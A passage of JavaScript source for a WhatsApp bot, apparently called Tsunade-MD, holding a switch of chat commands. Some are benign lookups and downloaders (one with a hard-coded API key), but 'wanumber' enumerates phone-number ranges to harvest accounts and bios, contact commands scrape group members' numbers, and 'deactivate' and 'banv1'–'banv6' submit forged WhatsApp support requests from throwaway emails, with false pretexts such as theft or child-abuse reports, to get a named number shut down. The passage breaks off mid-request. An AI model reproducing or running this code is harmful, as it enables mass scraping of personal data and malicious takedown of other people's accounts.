            imdbt += "🌐 *Language:* " + fids.data.Language + "\n"
            imdbt += "🌍 *Country:* " + fids.data.Country + "\n"
            imdbt += "🎖️ *Awards:* " + fids.data.Awards + "\n"
            imdbt += "📦 *Box office:* " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️ Production:* " + fids.data.Production + "\n"
            imdbt += "🌟 *IMDb Rating:* " + fids.data.imdbRating + "\n"
            imdbt += "✅ *IMDb Votes:* " + fids.data.imdbVotes + "\n\n"
            imdbt += "*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*"
           TsunadeBot.sendMessage(m.chat, {
                image: {
                    url: fids.data.Poster,
                },
                caption: imdbt,
            }, {
                quoted: m,
            })
            break
            case 'weather':{
if (!text) return replygcmznking('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🧚 *TSUNADE WEATHER INFO* 🧚\n\n`
            textw += `🌤️ *Weather of ${text}*\n\n`
            textw += `🌡️*Weather:* ${wdata.data.weather[0].main}\n`
            textw += `📝 *Description:* ${wdata.data.weather[0].description}\n`
            textw += `🌡️ *Avg Temp:* ${wdata.data.main.temp}\n`
            textw += `🤔 *Feels Like:* ${wdata.data.main.feels_like}\n`
            textw += `🌬️ *Pressure:* ${wdata.data.main.pressure}\n`
            textw += `☁️ *Humidity:* ${wdata.data.main.humidity}\n`
            textw += `💨 *Wind speed:* ${wdata.data.wind.speed}\n`
            textw += `🌍 *Latitude:* ${wdata.data.coord.lat}\n`
            textw += `🌍 *Longitude:* ${wdata.data.coord.lon}\n`
            textw += `🌐 *Country:* ${wdata.data.sys.country}\n\n`
            textw += `*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`
           TsunadeBot.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break
           case 'wanumber': case 'nowa': case 'searchno': case 'searchnumber':{
           	if (!text) return replygcmznking(`*Please provide number xxx fpr `)
var inputnumber = text.split(" ")[0]
        
        replygcmznking(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `🪀 *List of Whatsapp Numbers* 🪀\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers without whatsapp account.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await TsunadeBot.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await TsunadeBot.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `📞 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 📝 *Bio :* ${anu1.status}\n📅 *Bio update :* ${moment(anu1.setAt).tz(timezone).format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        replygcmznking(`${text66}${nobio}${nowhatsapp}`)
        }
break
case "idgroup": case "groupid": {
if (!MznKingTheCreator) return MznKingOwnerReply()
let getGroups = await TsunadeBot.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *GROUPS LIST*\n\n*Total Groups:* ${anu.length} Groups\n\n`
for (let x of anu) {
let metadata2 = await TsunadeBot.groupMetadata(x)
teks += `◉ Name : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
replygcmznking(teks + `*Group id and text are required.*\n${prefix}pushcontact idgroup|text\n\nGet group id from above groups list.`)
}
break
case 'getcontact': case 'getcon': {
if (!m.isGroup) return MznKingGroupReply()
if (!(isGroupAdmins || MznKingTheCreator)) return MznKingAdminReply()
mznkingbigpp = await TsunadeBot.sendMessage(m.chat, {
    text: `\n👪 Group: *${groupMetadata.subject}*\n👤 Members: *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000)
TsunadeBot.sendContact(m.chat, participants.map(a => a.id), mznkingbigpp)
}
break
case 'savecontact': case 'svcontact':{
if (!m.isGroup) return MznKingGroupReply()
if (!(isGroupAdmins || MznKingTheCreator)) return MznKingAdminReply()
let cmiggc = await TsunadeBot.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}
let nmfilect = './contacts.vcf'
replygcmznking('\n*Wait a while...*'+cmiggc.participants.length+' contact')
require('fs').writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
TsunadeBot.sendMessage(m.chat, {
    document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: '\nTSUNADE BOT\nGroup: *'+cmiggc.subject+'*\nContact: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
require('fs').unlinkSync(nmfilect)
}
break
case 'sendcontact': case 'sencontact': {
if (!m.isGroup) return MznKingGroupReply()
if (!m.mentionedJid[0]) return replygcmznking('\nUse like this\n Example:.sendcontact @tag|name')
let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
TsunadeBot.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
}
break
case 'contacttag': case 'contag':{
if (!m.isGroup) return MznKingGroupReply()
if (!(isGroupAdmins || MznKingTheCreator)) return MznKingAdminReply()
if (!m.mentionedJid[0]) return replygcmznking('\nUse like this\n Example:.contacttag @tag|name')
let sngTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let sngContact = {
	displayName: "Contact", contacts: [{displayName: sngTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+sngTak+";;;\nFN:"+sngTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
TsunadeBot.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
}
break
case 'ai':
case 'openai': {
                if (!text) return replygcmznking(`*Please provide a prompt for openai.\n${prefix+command} What is openai?`)
                let d = await fetchJson(`https://vihangayt.me/tools/chatgpt4?q=${text}`)                
                replygcmznking(d.data)
           }
           break
case 'mathsai': {
                if (!text) return replygcmznking(`*Please provide a question.*\n${prefix+command} What is the answer 1+5?`)
                let d = await fetchJson(`https://vihangayt.me/tools/mathssolve?q=${text}`)                
                replygcmznking(d.data)
           }
case 'blackbox': {
                if (!text) return replygcmznking(`*Please provide a prompt for Blackbox AI.*\n${prefix+command} Write python code for print.`)
                let d = await fetchJson(`https://mzn-api.onrender.com/ai/blackbox?prompt=${text}`)                
                replygcmznking(d.response)
           }
            break
case 'igvideo':
case 'igvid':{
if (!q) return replygcmznking(`*Please provide a Instagram video url.\n${prefix+command} https://instagram.com`)
let res = await fetch(`https://vihangayt.me/download/instagram?url=${q}`)
let json = await res.json()
TsunadeBot.sendMessage(m.chat, { video: { url: json.data.data[0].url }, caption: message.success }, {quoted: m})
.catch(console.error)
}
break
case 'igimage':
case 'igimg':{
if (!text) return replygcmznking(`*Please provide a Instagram image url.\n${prefix+command} https://instagram.com`)
let resmznking = await fetch(`https://vihangayt.me/download/instagram?url=${text}`)
let jsonmznking = await resmznking.json()
TsunadeBot.sendMessage(m.chat, { image: { url: jsonmznking.data.data[0].url }, caption: message.success }, {quoted:m})
.catch(console.error)
}
break
case 'apk':
case 'apkdl': {
if (!text) return replygcmznking(`*Please provide a app name or package name of app.*\nFor example: ${prefix+command} WhatsApp`)
let resmznking = await fetch(`https://vihangayt.me/download/apk?id=${text}`)
let jsonmznking = await resmznking.json()
TsunadeBot.sendMessage(from, { document: { url: jsonmznking.data.dllink}, fileName : jsonmznking.data.name, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
.catch(console.error)
}
break
case 'telestick': {
	if (m.isGroup) return MznKingPrivateReply()
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let mznkingresources = await Telesticker(args[0])
		await replygcmznking(`*Sending ${mznkingresources.length} stickers from telegram...*`)
		if (m.isGroup && mznkingresources.length > 30) {
			await replygcmznking('*Please check your inbox messages. Stickers have been sent to private chat* 🤗')
			for (let i = 0; i < mznkingresources.length; i++) {
				TsunadeBot.sendMessage(m.sender, { sticker: { url: mznkingresources[i].url }})
			}
		} else {
			for (let i = 0; i < mznkingresources.length; i++) {
				TsunadeBot.sendMessage(m.chat, { sticker: { url: mznkingresources[i].url }})
			}
		}
	} else replygcmznking(`*Please provide a link of telegram sticker pack.\nFor example. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break
case 'searchstick': {
	if (!args[0]) return replygcmznking(`*Please provide a query for search sticker.*\nFor example: ${prefix + command} angel`)
	const fg = require('api-dylux')
    try {
   let json = await fg.StickerSearch(text) 
    replygcmznking(`
➢ *Title:* ${json.title}
➢ *Total stickers:* ${json.sticker_url.length}
➢ *Shipping time:* _*${json.sticker_url.length * 2} s*_`)
    for (let i of json.sticker_url) {
        TsunadeBot.sendMessage(m.sender, { sticker: { url: json.sticker_url } })
    }
    } catch (e) {
	replygcmznking(`*An error occurred while processing your request.*`)
	} 
}
break
case 'circlevideo': {
try {
const mznkingbaileys = await require("@whiskeysockets/baileys").generateWAMessageContent({ video: await m.quoted.download() }, { upload: TsunadeBot.waUploadToServer })
await TsunadeBot.relayMessage(from, { ptvMessage: { ...mznkingbaileys.videoMessage } }, {})
} catch (err) {
replygcmznking(`*Please reply or send video with caption:*\n ${prefix + command}`)
}
}
break
            case 'statustext': 
            case 'upswtext': {
               if (!MznKingTheCreator) return MznKingOwnerReply()
               if (!q) return replygcmznking('*Please enter a text.*')
               await TsunadeBot.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FFC0CB', font: 3, statusJidList: Object.keys(global.db.users) })
               replygcmznking(`🧚 *Successfully status updated, Please check the status.*`)
            }
            break
                        case 'statusvideo':
            case 'upswvideo': {
               if (!MznKingTheCreator) return MznKingOwnerReply()
               await MznKingWaitReply()
               if (/video/.test(mime)) {
                  var MznKingSwVid = await TsunadeBot.downloadAndSaveMediaMessage(quoted)
                  await TsunadeBot.sendMessage('status@broadcast', {
                     video: {
                        url: MznKingSwVid
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.users) })
                  await replygcmznking(`🧚 *Successfully status updated, Please check the status.*`)
               } else {
                  replygcmznking('*Please reply to video.*')
               }
            }
            break
            case 'statusimage':
            case 'upswimage': {
               if (!MznKingTheCreator) return MznKingOwnerReply()
               await MznKingWaitReply()
               if (/image/.test(mime)) {
                  var MznKingSwImg = await TsunadeBot.downloadAndSaveMediaMessage(quoted)
                  await TsunadeBot.sendMessage('status@broadcast', {
                     image: {
                        url: MznKingSwImg
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.users)})
                  await replygcmznking(`🧚 *Successfully status updated, Please check the status.*`)
               } else {
                  replygcmznking('*Please reply to a image.*')
               }
            }
            break
            case 'statusaudio':
            case 'upswaudio': {
               if (!MznKingTheCreator) return MznKingOwnerReply()
               await MznKingWaitReply()
               if (/audio/.test(mime)) {
                  var MznKingSwAud = await TsunadeBot.downloadAndSaveMediaMessage(quoted)
                  await TsunadeBot.sendMessage('status@broadcast', {
                     audio: {
                        url: MznKingSwAud
                     },
                     mimetype: 'audio/mp4',
                     ptt: true
                  }, {
                     backgroundColor: '#FFC0CB',
                     statusJidList: Object.keys(global.db.users)
                  })
                  await replygcmznking(`🧚 *Successfully status updated, Please check the status.*`)
               } else {
                  replygcmznking('*Please reply to audio.*')
               }
            }
            break
case 'deactivate': {
if (!args[0]) return replygcmznking(`*Please enter a valid whatsapp number.*\nFor example: ${prefix+command} 947676767676`)
let mznkingnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let mznkingtesx = await TsunadeBot.onWhatsApp(mznkingnumx)
if (mznkingtesx.length == 0) return replygcmznking(`*Please enter a valid whatsapp number.*`)
let axioss = require("axios")  
let mznkingxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = mznkingxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(mznkingxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", mznkingnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
TsunadeBot.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv1': {
if (!args[0]) return replygcmznking(`*Please enter a valid whatsapp number.*\nFor example: ${prefix+command} 947676767676`)
let mznkingnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let mznkingtesx = await TsunadeBot.onWhatsApp(mznkingnumx)
if (mznkingtesx.length == 0) return replygcmznking(`*Please enter a valid whatsapp number.*`)
let axioss = require("axios")  
let mznkingxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = mznkingxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(mznkingxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", mznkingnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
TsunadeBot.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv2': {
if (!args[0]) return replygcmznking(`*Please enter a valid whatsapp number.*\nFor example: ${prefix+command} 947676767676`)
let mznkingnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let mznkingtesx = await TsunadeBot.onWhatsApp(mznkingnumx)
if (mznkingtesx.length == 0) return replygcmznking(`*Please enter a valid whatsapp number.*`)
let axioss = require("axios")  
let mznkingxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = mznkingxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(mznkingxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", mznkingnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
TsunadeBot.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv3': {
if (!args[0]) return replygcmznking(`*Please enter a valid whatsapp number.*\nFor example: ${prefix+command} 947676767676`)
let mznkingnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let mznkingtesx = await TsunadeBot.onWhatsApp(mznkingnumx)
if (mznkingtesx.length == 0) return replygcmznking(`*Please enter a valid whatsapp number.*`)
let axioss = require("axios")  
let mznkingxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = mznkingxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(mznkingxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", mznkingnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
TsunadeBot.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv4': {
if (!args[0]) return replygcmznking(`*Please enter a valid whatsapp number.*\nFor example: ${prefix+command} 947676767676`)
let mznkingnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let mznkingtesx = await TsunadeBot.onWhatsApp(mznkingnumx)
if (mznkingtesx.length == 0) return replygcmznking(`*Please enter a valid whatsapp number.*`)
let axioss = require("axios")  
let mznkingxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = mznkingxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(mznkingxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", mznkingnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
TsunadeBot.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv5': {
if (!args[0]) return replygcmznking(`*Please enter a valid whatsapp number.*\nFor example: ${prefix+command} 947676767676`)
mznkingnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let mznkingtesx = await TsunadeBot.onWhatsApp(mznkingnumx)
if (mznkingtesx.length == 0) return replygcmznking(`*Please enter a valid whatsapp number.*`)
let axioss = require("axios")  
let mznkingxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = mznkingxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(mznkingxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", mznkingnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
TsunadeBot.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv6': {
if (!args[0]) return replygcmznking(`*Please enter a valid whatsapp number.*\nFor example: ${prefix+command} 947676767676`)
let mznkingnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let mznkingtesx = await TsunadeBot.onWhatsApp(mznkingnumx)
if (mznkingtesx.length == 0) return replygcmznking(`*Please enter a valid whatsapp number.*`)
let axioss = require("axios")  
let mznkingxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = mznkingxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(mznkingxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", mznkingnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
TsunadeBot.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv1': {
if (!args[0]) return replygcmznking(`*Please enter a valid whatsapp number.*\nFor example: ${prefix+command} 947676767676`)
let mznkingnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let mznkingtesx = await TsunadeBot.onWhatsApp(mznkingnumx)
if (mznkingtesx.length == 0) return replygcmznking(`*Please enter a valid whatsapp number.*`)
let axioss = require("axios")  
let mznkingxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = mznkingxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(mznkingxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", mznkingnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
TsunadeBot.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv2': {
if (!args[0]) return replygcmznking(`*Please enter a valid whatsapp number.*\nFor example: ${prefix+command} 947676767676`)
let mznkingnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let mznkingtesx = await TsunadeBot.onWhatsApp(mznkingnumx)
if (mznkingtesx.length == 0) return replygcmznking(`*Please enter a valid whatsapp number.*`)
let axioss = require("axios")  
let mznkingxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = mznkingxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(mznkingxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", mznkingnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
TsunadeBot.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv3': {
if (!args[0]) return replygcmznking(`*Please enter a valid whatsapp number.*\nFor example: ${prefix+command} 947676767676`)
let mznkingnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let mznkingtesx = await TsunadeBot.onWhatsApp(mznkingnumx)
if (mznkingtesx.length == 0) return replygcmznking(`*Please enter a valid whatsapp number.*`)
let axioss = require("axios")  
let mznkingxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = mznkingxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(mznkingxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", mznkingnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
